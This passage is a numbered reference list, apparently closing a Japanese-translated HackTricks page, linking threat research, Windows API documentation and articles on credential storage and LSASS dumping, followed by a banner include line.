- [3] [Check Point Research – Ink Dragon の内部: リレーネットワークと、ステルス性の高い攻撃作戦の内部構造を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: パスワードレス認証における新たな攻撃対象領域](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows Hacking: Microsoft のシステムとネットワークへの攻撃](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory のデータストアの実際の仕組み: NTDS.dit の内部 (Part 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass のダンプによるパスワード取得](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho、Still Toolkit でサイバースパイ活動の武器を拡充](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW 関数と `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy の `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – アクティブなセッションの終了](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
